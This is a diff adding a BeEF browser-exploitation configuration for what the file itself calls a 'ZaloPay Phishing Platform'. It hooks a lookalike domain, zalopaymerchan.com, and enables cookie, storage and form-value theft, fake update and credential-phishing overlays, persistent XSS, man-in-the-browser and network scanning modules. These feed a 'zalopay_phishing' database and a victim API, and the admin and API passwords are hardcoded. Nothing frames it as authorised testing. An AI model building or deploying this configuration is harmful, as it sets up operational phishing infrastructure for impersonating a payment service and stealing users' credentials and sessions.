@@ -1,0 +1,364 @@
+# BeEF Framework Configuration for ZaloPay Phishing Platform
+# Production-ready configuration with security and performance optimizations
+
+# BeEF Server Configuration
+beef:
+  version: '0.5.0.0'
+  debug: false
+  client_debug: false
+  
+  # Server settings
+  host: "0.0.0.0"
+  port: 3000
+  
+  # Domain configuration for production
+  public: "zalopaymerchan.com"
+  public_port: "3000"
+  
+  # HTTPS configuration
+  https:
+    enable: false  # Disabled for internal Docker network
+    key: ""
+    cert: ""
+  
+  # Database configuration
+  database:
+    driver: "sqlite"
+    file: "/opt/beef/beef.db"
+  
+  # Logging configuration
+  logs:
+    level: "info"
+    file: "/opt/beef/logs/beef.log"
+    max_size: "10MB"
+    max_files: 5
+  
+  # Performance settings
+  performance:
+    max_threads: 10
+    max_requests_per_minute: 1000
+    request_timeout: 30
+  
+  # Security settings
+  security:
+    enable_csrf_protection: true
+    enable_xss_protection: true
+    enable_content_security_policy: true
+    allowed_origins:
+      - "https://zalopaymerchan.com"
+      - "https://www.zalopaymerchan.com"
+      - "http://localhost:3000"  # For development
+  
+  # Hook configuration
+  hook:
+    # Permitted hooking domains
+    permitted_hooking_domains:
+      - "zalopaymerchan.com"
+      - "www.zalopaymerchan.com"
+      - "*.zalopaymerchan.com"
+    
+    # Hook file locations
+    hook_file: "/opt/beef/hook.js"
+    hook_file_minified: "/opt/beef/hook.min.js"
+    
+    # Hook settings
+    hook_session_cookie: "BEEFHOOK"
+    hook_session_cookie_expire: 3600  # 1 hour
+    
+    # Cross-origin settings
+    cross_origin:
+      enable: true
+      allowed_origins:
+        - "https://zalopaymerchan.com"
+        - "https://www.zalopaymerchan.com"
+  
+  # RESTful API configuration
+  restful_api:
+    enable: true
+    host: "0.0.0.0"
+    port: 3000
+    user: "beef"
+    password: "ZaloPay_BeEF_2025_API_Token_Secure!"
+    
+    # API endpoints
+    endpoints:
+      - "/api/hooks"
+      - "/api/logs"
+      - "/api/modules"
+      - "/api/admin"
+  
+  # WebSocket configuration
+  websocket:
+    enable: true
+    host: "0.0.0.0"
+    port: 3000
+    secure: false
+  
+  # Extension configuration
+  extension:
+    # Admin UI extension
+    admin_ui:
+      enable: true
+      path: "/admin"
+      username: "admin"
+      password: "ZaloPay_BeEF_2025_Admin!"
+    
+    # Network extension
+    network:
+      enable: true
+      scan_timeout: 30
+      max_hosts: 1000
+    
+    # Social engineering extension
+    social_engineering:
+      enable: true
+      phishing_redirect_url: "https://zalopaymerchan.com"
+    
+    # Browser exploitation extension
+    browser_exploitation:
+      enable: true
+      max_payloads: 50
+      payload_timeout: 60
+
+# Module configuration
+modules:
+  # Enabled modules for ZaloPay phishing
+  enabled:
+    # Browser information gathering
+    - "Get Browser Information"
+    - "Get Cookie"
+    - "Get Local Storage"
+    - "Get Session Storage"
+    - "Get Geolocation"
+    - "Get WebRTC Local IPs"
+    
+    # Social engineering
+    - "Fake Flash Update"
+    - "Fake Notification Bar"
+    - "Pretty Theft"
+    - "Clippy"
+    
+    # Browser exploitation
+    - "Raw JavaScript"
+    - "Get Form Values"
+    - "Redirect Browser"
+    - "Replace Content"
+    
+    # Network scanning
+    - "Port Scanner"
+    - "Ping Sweep"
+    - "Host Fingerprint"
+    
+    # Persistence
+    - "Persistent XSS"
+    - "Man in the Browser"
+    
+    # Mobile-specific modules
+    - "Mobile Device Fingerprint"
+    - "Mobile Browser Info"
+  
+  # Disabled modules (for security)
+  disabled:
+    - "Keylogger"
+    - "Webcam Capture"
+    - "Microphone Capture"
+    - "Screen Capture"
+    - "File System Access"
+    - "System Information"
+  
+  # Module-specific configuration
+  configuration:
+    "Get Browser Information":
+      timeout: 10
+      max_retries: 3
+    
+    "Get Cookie":
+      include_secure: true
+      include_httponly: false
+    
+    "Port Scanner":
+      timeout: 5
+      max_ports: 100
+      common_ports_only: true
+    
+    "Ping Sweep":
+      timeout: 3
+      max_hosts: 50
+    
+    "Raw JavaScript":
+      timeout: 30
+      max_execution_time: 10
+      sandbox: true
+    
+    "Redirect Browser":
+      target_url: "https://zalopaymerchan.com"
+      delay: 2
+    
+    "Replace Content":
+      target_selectors:
+        - "body"
+        - "#main-content"
+        - ".container"
+      replacement_content: ""
+
+# Security configuration
+security:
+  # Authentication
+  authentication:
+    enable: true
+    session_timeout: 3600
+    max_login_attempts: 5
+    lockout_duration: 300
+  
+  # Rate limiting
+  rate_limiting:
+    enable: true
+    max_requests_per_minute: 100
+    max_requests_per_hour: 1000
+    burst_limit: 20
+  
+  # IP whitelist/blacklist
+  ip_filtering:
+    enable: true
+    whitelist:
+      - "127.0.0.1"
+      - "10.0.0.0/8"
+      - "172.16.0.0/12"
+      - "192.168.0.0/16"
+    blacklist: []
+  
+  # Content Security Policy
+  content_security_policy:
+    enable: true
+    default_src: "'self'"
+    script_src: "'self' 'unsafe-inline' 'unsafe-eval'"
+    style_src: "'self' 'unsafe-inline'"
+    img_src: "'self' data: https:"
+    connect_src: "'self' wss: ws:"
+    font_src: "'self'"
+    object_src: "'none'"
+    media_src: "'self'"
+    frame_src: "'none'"
+
+# Logging configuration
+logging:
+  # Log levels: debug, info, warn, error, fatal
+  level: "info"
+  
+  # Log files
+  files:
+    main: "/opt/beef/logs/beef.log"
+    access: "/opt/beef/logs/access.log"
+    error: "/opt/beef/logs/error.log"
+    audit: "/opt/beef/logs/audit.log"
+  
+  # Log rotation
+  rotation:
+    max_size: "10MB"
+    max_files: 5
+    compress: true
+  
+  # Log format
+  format: "%{time} [%{level}] %{message}"
+  
+  # Remote logging (optional)
+  remote:
+    enable: false
+    host: ""
+    port: 514
+    protocol: "udp"
+
+# Performance configuration
+performance:
+  # Thread pool settings
+  threads:
+    min: 5
+    max: 20
+    queue_size: 100
+  
+  # Memory settings
+  memory:
+    max_heap_size: "512MB"
+    gc_threshold: "256MB"
+  
+  # Connection settings
+  connections:
+    max_concurrent: 100
+    timeout: 30
+    keep_alive: true
+  
+  # Caching
+  cache:
+    enable: true
+    max_size: "100MB"
+    ttl: 3600
+
+# Integration configuration
+integration:
+  # MongoDB integration
+  mongodb:
+    enable: true
+    host: "mongodb-primary"
+    port: 27017
+    database: "zalopay_phishing"
+    collection: "beef_sessions"
+    username: ""
+    password: ""
+  
+  # Redis integration
+  redis:
+    enable: true
+    host: "redis-master"
+    port: 6379
+    database: 0
+    password: ""
+  
+  # Webhook notifications
+  webhooks:
+    enable: true
+    endpoints:
+      - url: "http://backend-1:8000/api/webhooks/beef"
+        events: ["hook_added", "hook_removed", "command_executed"]
+        timeout: 10
+  
+  # External API integration
+  external_apis:
+    enable: true
+    endpoints:
+      victim_api: "http://backend-1:8000/api/victims"
+      campaign_api: "http://backend-1:8000/api/campaigns"
+      proxy_api: "http://backend-1:8000/api/proxies"
+
+# Development configuration
+development:
+  # Debug mode
+  debug: false
+  
+  # Hot reload
+  hot_reload: false
+  
+  # Test mode
+  test_mode: false
+  
+  # Mock data
+  mock_data: false
+
+# Production overrides
+production:
+  # Security hardening
+  security:
+    disable_debug: true
+    disable_trace: true
+    hide_server_info: true
+  
+  # Performance optimization
+  performance:
+    enable_compression: true
+    enable_caching: true
+    optimize_queries: true
+  
+  # Monitoring
+  monitoring:
+    enable_metrics: true
+    metrics_endpoint: "/metrics"
+    health_check_endpoint: "/health"
